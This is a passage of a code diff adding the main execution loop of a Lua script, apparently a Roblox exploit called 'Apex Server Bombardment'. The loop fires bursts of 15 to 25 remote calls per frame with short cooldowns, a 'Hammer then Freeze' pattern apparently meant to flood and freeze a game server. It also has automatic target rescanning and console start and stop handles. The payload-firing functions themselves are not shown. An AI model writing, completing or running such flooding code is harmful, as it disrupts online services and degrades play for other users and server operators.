+-- MODULE 7: MAIN EXECUTION LOOP (Dormant until Config.Active becomes true)
+-- ============================================================================
+task.spawn(function()
+    while true do
+        Services.RunService.Heartbeat:Wait()
+        
+        if Config.Active then
+            ApexEngine:ResolveTargets()
+            
+            -- Hammer Burst: 15 to 25 remote transmissions per tick
+            local burstCount = math.random(15, 25)
+            for i = 1, burstCount do
+                if not Config.Active then break end
+                ApexEngine:FirePayloads()
+            end
+            
+            -- Mandatory Real Cooldown (0.5 - 0.7s) to form the "Hammer then Freeze" rhythm
+            local cooldown = math.random(50, 70) / 100
+            if Config.FullFreezeActive then
+                cooldown = 0.02
+            end
+            task.wait(cooldown)
+        end
+    end
+end)
+
+-- Background UI and Statistics Refresher Loop
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        if GUI.RemoteStat then
+            GUI.UpdateStats()
+        end
+    end
+end)
+
+-- Background Rescan Loop (Only executes if active and enabled)
+task.spawn(function()
+    while true do
+        task.wait(12)
+        if Config.Active and Config.AutoRescan then
+            ApexEngine:ScanEnvironment()
+        end
+    end
+end)
+
+-- ============================================================================
+-- INITIALIZATION SEQUENCE (Loads UI into standby, zero execution of actions)
+-- ============================================================================
+Log("Apex Server Bombardment loaded into memory. STANDBY MODE. Press START to activate.")
+GUI.Initialize()
+
+Services.StarterGui:SetCore("SendNotification", {
+    Title = "✓ Apex Bombardment Ready";
+    Text = "Script loaded. Press START button to begin.";
+    Duration = 5;
+})
+
+-- Global console handles
+getgenv().ApexServerBombardment = {
+    Start = function()
+        Config.Active = true
+        if not Cache.Initialized then ApexEngine:ScanEnvironment() ApexEngine:ResolveTargets() end
+        GUI.UpdateStatus()
+        Log("Activated via console command.")
+    end,
+    Stop = function()
+        Config.Active = false
+        GUI.UpdateStatus()
+        Log("Stopped via console command.")
+    end,
+    Rescan = function()
+        ApexEngine:ScanEnvironment()
+        ApexEngine:ResolveTargets()
+        GUI.UpdateStats()
+        Log("Manual rescan complete.")
+    end,
+    Stats = Cache.Stats
+}
